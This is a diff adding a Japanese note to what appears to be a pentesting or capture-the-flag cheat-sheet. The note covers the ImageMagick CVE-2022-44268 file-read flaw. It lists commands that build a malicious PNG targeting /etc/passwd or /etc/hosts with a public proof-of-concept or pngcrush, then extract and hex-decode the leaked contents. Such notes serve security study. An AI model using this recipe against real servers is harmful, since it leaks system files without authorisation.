@@ -783,6 +783,43 @@ curl: (3) [globbing] bad range in column 9
 curl: (3) [globbing] unmatched close brace/bracket in column 3
 ```
 
+## CVE-2022-44268 (ImageMagick)
+
+- ImageMagick 7.1.0 のLFI脆弱性
+- ペイロードを含む画像をアップロードし、サーバー側で変換した画像の中にテキストファイルの内容が埋め込まれる
+- 疑わしい場合、変換後の画像ファイルをexiftoolにかけるとImageMagickのバージョンが出ている可能性があるので確認する
+
+```sh
+$ git clone https://git.rotfl.io/v/CVE-2022-44268.git
+$ CVE-2022-44268
+$ cargo run "/etc/passwd"
+$ ls
+Cargo.lock  Cargo.toml  image.png  README.md  screens  src  target
+```
+
+```sh
+$ identify -verbose ./image2.png
+（中略）
+    1370
+726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d
+（以下略）
+```
+
+デコード
+
+```sh
+python3 -c 'print(bytes.fromhex("[略]").decode("utf-8"))'
+```
+
+または
+
+```sh
+pngcrush -text a "profile" "/etc/hosts" vjp.png
+
+exiftool pngout.png
+Profile                         : /etc/hosts
+```
+
 ## CVE-2022-26134 (Atlassian)
 
 https://tryhackme.com/room/cve202226134
